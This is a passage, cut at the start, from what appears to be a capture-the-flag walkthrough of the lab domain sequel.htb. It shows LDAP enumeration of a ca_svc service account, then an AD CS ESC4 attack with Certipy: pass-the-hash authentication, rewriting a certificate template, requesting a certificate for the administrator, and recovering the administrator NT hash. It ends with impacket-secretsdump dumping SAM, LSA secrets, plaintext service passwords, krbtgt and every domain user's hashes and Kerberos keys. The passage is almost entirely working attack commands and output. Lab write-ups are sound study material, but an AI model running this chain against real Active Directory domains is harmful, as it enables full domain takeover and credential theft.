LDAP        10.10.11.51     389    DC01             distinguishedName:   CN=Certification Authority,CN=Users,DC=sequel,DC=htb
LDAP        10.10.11.51     389    DC01             instanceType:        4
LDAP        10.10.11.51     389    DC01             whenCreated:         20240609171347.0Z
LDAP        10.10.11.51     389    DC01             whenChanged:         20250118202230.0Z
LDAP        10.10.11.51     389    DC01             displayName:         Certification Authority
LDAP        10.10.11.51     389    DC01             uSNCreated:          102493
LDAP        10.10.11.51     389    DC01             memberOf:            CN=Cert Publishers,CN=Users,DC=sequel,DC=htb
LDAP        10.10.11.51     389    DC01             uSNChanged:          217383
LDAP        10.10.11.51     389    DC01             name:                Certification Authority
LDAP        10.10.11.51     389    DC01             objectGUID:          0x3e5e38923701e24c8c89ab65146f03fd
LDAP        10.10.11.51     389    DC01             userAccountControl:  66048
LDAP        10.10.11.51     389    DC01             badPwdCount:         0
LDAP        10.10.11.51     389    DC01             codePage:            0
LDAP        10.10.11.51     389    DC01             countryCode:         0
LDAP        10.10.11.51     389    DC01             badPasswordTime:     133817052449516438
LDAP        10.10.11.51     389    DC01             lastLogoff:          0
LDAP        10.10.11.51     389    DC01             lastLogon:           133817052514151733
LDAP        10.10.11.51     389    DC01             logonHours:          0xffffffffffffffffffffffffffffffffffffffffff
LDAP        10.10.11.51     389    DC01             pwdLastSet:          133817053500922661
LDAP        10.10.11.51     389    DC01             primaryGroupID:      513
LDAP        10.10.11.51     389    DC01             objectSid:           0x010500000000000515000000bd0bb4207c08fa390ad865d047060000
LDAP        10.10.11.51     389    DC01             accountExpires:      0
LDAP        10.10.11.51     389    DC01             logonCount:          4
LDAP        10.10.11.51     389    DC01             sAMAccountName:      ca_svc
LDAP        10.10.11.51     389    DC01             sAMAccountType:      805306368
LDAP        10.10.11.51     389    DC01             userPrincipalName:   ca_svc@sequel.htb
LDAP        10.10.11.51     389    DC01             servicePrincipalName: sequel.htb/ca_svc.DC01
LDAP        10.10.11.51     389    DC01             objectCategory:      CN=Person,CN=Schema,CN=Configuration,DC=sequel,DC=htb
LDAP        10.10.11.51     389    DC01             dSCorePropagationData: 20250118202230.0Z 20250118202229.0Z 20250118202040.0Z 20250118202035.0Z 16010101000000.0Z
LDAP        10.10.11.51     389    DC01             lastLogonTimestamp:  133817039597377157
LDAP        10.10.11.51     389    DC01             msDS-KeyCredentialLink: B:828:000200002000017896A526A77902AB9F34AC8FE4D3044FF9C8BD9C6025A7D3D2EF83E534EA987920000262AC2E03C6AEFB2F98D76EE7EEE2B4C7981A1BA2F17686A145751C26FD87235B1B0103525341310008000003000000000100000000000000000000010001F14A8435DFEA93F71906769606DA3F2D1EC2403BD88798FD147CE68A342CDCC43EA1407E9FA47FC9773295F3E5DD3F7B75460535C9A7E556AA699AB1E9E2F846BF633A06D33DF1F598C31E2120910E6AAB42E17D9A8E9A91840D444C29B2CDF44E2A50AB89B4BAC0D1ECF304BFAB48F43CFE9C06FFED9BA2F241456438690B25D1878D71D45570FB60641D56B2A27B5E0F1234B2848C4578C93E0AF936D0DEAA1885428D2DF8405C4BF363C3AE28D28CAF9FF305C2E47EABDC2C8A3C5FBBC4E19BBDEAAF456CD22AA7CC5B109B36CBDBD79CA6176F24852FBE29DA721B6662BC43C3BE7C8ED08D00934318DE21691265D1CCAAE0776488B3072E06796898A9390100040101000500100006F09C8A32EE02FC4AA377E2CFE0763BF402000701000800082050FC02E569DB010800092050FC02E569DB01:CN=Certification Authority,CN=Users,DC=sequel,DC=htb B:828:0002000020000162C5FA8E94754A737713BACC58DA3520157C79E5E0B64D03A7788BE07204215C20000292E231017F13862D0205C7CE24EE975443DF1190FCEB81CD0C2B96D6626C522D1B0103525341310008000003000000000100000000000000000000010001AC4BF4AF8077578A22709DDF40C68205B4A98327BEF3651E057D5EF00E6B0272F21869F319C89E592D758450491EEFE9B07903D1ADBC8F67535723B075E680810F1701BD292EDF307E9B91B0C4CA3706DD74A48B97216911EA65154564F8B8408A005DFE374F0755843DD79216DFE4B291DF6873A04630C6ADC582D63092E3B13C739C2478614A727951E06721ACA478978C32D0D5C7F858987A3B321D57A19A34E92045EC25FB86B7825EC090ACA2B1C6D642920779BEEADCD48B7F243CD9BBB5219645B4C8A12C3FA8734D50602DB2E348274DBEE473F9296035343087ED9534751D16C9106524364C812D3728FB6ED77657E755711DDE111EA0E67D743FB3010004010100050010000608B666CEDE1A60792131B4F1051093CF0200070100080008726B6328E469DB01080009726B6328E469DB01:CN=Certification Authority,CN=Users,DC=sequel,DC=htb B:828:0002000020000140E2FB4263FEDA87E66ED91B29784F06D7C9BDF3F8957F93C8B0D54A483E24FA200002C2701E2229F2811CB348D78CA23EECAF3975FB861B08B96ACE51EC42F33924911B0103525341310008000003000000000100000000000000000000010001E8F1309E36089144E88049A2F4EA84DEB8912529C8C495340D58039AC04A392179E21EE615C6000B34A9E191752411227EBD9AA779059885C8980B716D60C2D20AAC9C1C1BDBA0D3CE4A82E28F02311AECB2CF8ED55176CFB398D9DDD81D83E1004250043A60B9D70DB0DE027A23E3D8CE5F1782CD22FBF71B8F98EF6C3CEB917ED311F05AD5D30DB5834B75B981B69173A01FB020EA2B348D69730B466BC1BC4EE929A43EAF8031A035F75CFE5AD7741039BFCBD1B14B933B0F606766494565A51374ECC843E433CB2D35665ECF4CA2FD039EFD3768497672E3D462EF4D1B5066BDF138BAEEBBD6F4309E2BE0657AA86FEBFB5D68A7F4840F4A100C1809FBE9010004010100050010000635028C016CB0624DE900843D80C2768E020007010008000826AC4A73E669DB0108000926AC4A73E669DB01:CN=Certification Authority,CN=Users,DC=sequel,DC=htb B:828:00020000200001104C0901F36451522B2947FB5B1FC8DCD025CAADB3844119F4C301AC90A3F61920000299B2A20CD64D4A942ABF5B46DF10EEA4A756C618862947CD30DBEE08CBF0E65F1B0103525341310008000003000000000100000000000000000000010001A91A4E63846ABD3650B3EE6F7C01B7F2F7520A52CB560B732467AD1745756B7535AC666226E3689F77E475397F717854D73B1378C982CF3B917654FCD85F0C73FCD50FD4E47CD325B07D3C00DE7928F6FE56C9BC0ED4B9A9F22DA1C7AD26E2F962D1596D5846B1E736CD9D5EC301D36A8086D189764FF500A94604D60D26016D8048CD4A37CA14A9BDD8C4BE455BCE902C5FF34638E4816202B170B7CD72620964A058AA791A2509D06EC96285BE0EC41E032B1C1ADE62B8C53B7EE6739DBA389FEC2D8D04A173CA58ADAEEC0B3B1E9C2C452D97D8B65D4EA9B7DE86F07C0A0189A3EBC7D8D253FA6D7FBA98011907688C07594BF116B07DBF04DF991553245D0100040101000500100006FB16BDB45E0F04FB210CEB0514DCE6F402000701000800089DD0236BE369DB010800099DD0236BE369DB01:CN=Certification Authority,CN=Users,DC=sequel,DC=htb   
```

## Abuse Certification Authority rights

```
└─$ certipy find -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51                                          
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250118152920_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250118152920_Certipy.txt'
[*] Saved JSON output to '20250118152920_Certipy.json'
```

```
  33
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```


#### ESC4 

```
└─$ certipy template -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template 'DunderMifflinAuthentication' -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

```
└─$ certipy req -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -target sequel.htb -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn administrator@sequel.htb -ns 10.10.11.51 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'sequel.htb' at '10.10.11.51'
[+] Trying to resolve 'SEQUEL.HTB' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51 -debug                                                                                  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

```
└─$ impacket-secretsdump -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff sequel.htb/administrator@10.10.11.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x07057881f4c9d60499fd59bba9ae4929
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SEQUEL\DC01$:aes256-cts-hmac-sha1-96:cb5c43b6d92bb097d345a545f324f9caa4d6ef91c2f0267ecfc7ed76546a9df3
SEQUEL\DC01$:aes128-cts-hmac-sha1-96:eef978409ad7a2a86eef37f48de21850
SEQUEL\DC01$:des-cbc-md5:a892b025a1684ad9
SEQUEL\DC01$:plain_password_hex:799d42a4c9050c328e8bbdb7b93568b68c2b048291ccac285099a2029e7b37203a70ee818c14657a0048716ce61598e844de25b002668bf9b304071dbe5b681f8afb6b981f7ace9727b8dc45c4463f3be8ccbe7e8fd2948d677dc03ed85e5f6e903834c1c228969f7030294347ec4c57f6319edabb47b0efb564aba7f5f195e9a6815bb27fd69a4cf235d4df93f2c34a79978ade6e068c7e7e46eb1129a9e67dff6dfea58a354e6627309facd710b354fb66dcea17c845604bae941ce39fc49a3af7dc3d14bdc16d7f9c56ce9ef6243144c7ee18cf4664e5003a6c86073811a7866e70b130134934b09abd09a7964390
SEQUEL\DC01$:aad3b435b51404eeaad3b435b51404ee:66ad063789d27b459aeaf39372dc628a:::
[*] DefaultPassword 
SEQUEL\Administrator:n3KuDVzUicepJ0Bm
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x38bfbe5761658576a78af7d4c26e7a8a1422848a
dpapi_userkey:0x3adfe88507630dfd1f8a91a579d015f2427d1016
[*] NL$KM 
 0000   D4 CD C5 D0 C1 CB 45 04  6C EA 54 2E 91 E1 C3 2D   ......E.l.T....-
 0010   88 26 C2 04 00 30 F1 16  71 C1 DE A5 19 96 71 E2   .&...0..q.....q.
 0020   BB C7 38 D7 A4 25 6E 36  F0 2C 68 85 38 3E FD B1   ..8..%n6.,h.8>..
 0030   7E 3C 11 DC 3A 56 41 DC  6A 8F 32 D3 A3 F4 D8 5F   ~<..:VA.j.2...._
NL$KM:d4cdc5d0c1cb45046cea542e91e1c32d8826c2040030f11671c1dea5199671e2bbc738d7a4256e36f02c6885383efdb17e3c11dc3a5641dc6a8f32d3a3f4d85f
[*] _SC_MSSQL$SQLEXPRESS 
SEQUEL\sql_svc:WqSZAF6CysDQbGb3
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1acb6bdf708cb2e0b6802e77649e55cc:::
sequel.htb\michael:1103:aad3b435b51404eeaad3b435b51404ee:cafe5ec3c162eaf0d46e3013b0d71dba:::
sequel.htb\ryan:1114:aad3b435b51404eeaad3b435b51404ee:b9b72edb319dce49b5da313e71491133:::
sequel.htb\oscar:1116:aad3b435b51404eeaad3b435b51404ee:97504ea3a7ca31b7d91e26ef82e3e383:::
sequel.htb\sql_svc:1122:aad3b435b51404eeaad3b435b51404ee:b9b72edb319dce49b5da313e71491133:::
sequel.htb\rose:1601:aad3b435b51404eeaad3b435b51404ee:0e0b8e0b06c681da8c3f1f17e53a4a56:::
sequel.htb\ca_svc:1607:aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:66ad063789d27b459aeaf39372dc628a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:968abd11086022e97f88b30a22b0053b8ea85ba3ec7219073b2348412befd4a7
Administrator:aes128-cts-hmac-sha1-96:89e80e336f0e4e6cfc86bd492c6cad83
Administrator:des-cbc-md5:b0a4ad1a98311334
krbtgt:aes256-cts-hmac-sha1-96:fb9766744ab94559541847d2984c9831c815992e1070309a5cbc88c76b56f0cd
krbtgt:aes128-cts-hmac-sha1-96:f365950f1fe180450832470e1695d44c
krbtgt:des-cbc-md5:5db9c2fd578a1cd3
sequel.htb\michael:aes256-cts-hmac-sha1-96:e93493d0476db7d001d5f3b2ae25595b602bedc7108eaced0044748f6413a860
sequel.htb\michael:aes128-cts-hmac-sha1-96:8b8a6f85d95763c9c3fd721e8e33a270
sequel.htb\michael:des-cbc-md5:86bc0b2c3b5b5eec
sequel.htb\ryan:aes256-cts-hmac-sha1-96:676bd0149bfc8f193967991eaec21fc0af77c2364c360f363507e3d647bca2a8
sequel.htb\ryan:aes128-cts-hmac-sha1-96:4fff4b149f767c81378c977d14c5070c
sequel.htb\ryan:des-cbc-md5:1929372c084fdcd0
sequel.htb\oscar:aes256-cts-hmac-sha1-96:d0497357f3dfcbdcd80878db9ea6829f556b5eb25b3f8cbbe0416ae0223577bf
sequel.htb\oscar:aes128-cts-hmac-sha1-96:f4856b529096b1dbf3a6037ae501ce23
sequel.htb\oscar:des-cbc-md5:102f08dfb3d0c71f
sequel.htb\sql_svc:aes256-cts-hmac-sha1-96:3e9f4068aa26eebec597f04014f93846c5bd9d5b47a6acc89f16dafda3d620db
sequel.htb\sql_svc:aes128-cts-hmac-sha1-96:c3cd53730282eea99772bceb78cdf485
sequel.htb\sql_svc:des-cbc-md5:9b1357d3aea186b6
sequel.htb\rose:aes256-cts-hmac-sha1-96:f904a8eccae44567647e727118655b0e83ba8055c873dc3060c8b2d6fbcc4660
sequel.htb\rose:aes128-cts-hmac-sha1-96:efe028112c8b1662dea3a876c3fae28a
sequel.htb\rose:des-cbc-md5:0d9b13cbf88aa44f
sequel.htb\ca_svc:aes256-cts-hmac-sha1-96:d820f67f11df4ac5d4e22e9aafb7c8f2c07ea7491f06b8569d712a6eb9cf8cea
sequel.htb\ca_svc:aes128-cts-hmac-sha1-96:42d45fb86f8b69ba9b66bc195412aa15
sequel.htb\ca_svc:des-cbc-md5:405b7f263723626b
DC01$:aes256-cts-hmac-sha1-96:cb5c43b6d92bb097d345a545f324f9caa4d6ef91c2f0267ecfc7ed76546a9df3
DC01$:aes128-cts-hmac-sha1-96:eef978409ad7a2a86eef37f48de21850
DC01$:des-cbc-md5:c7b908f27919a854
```
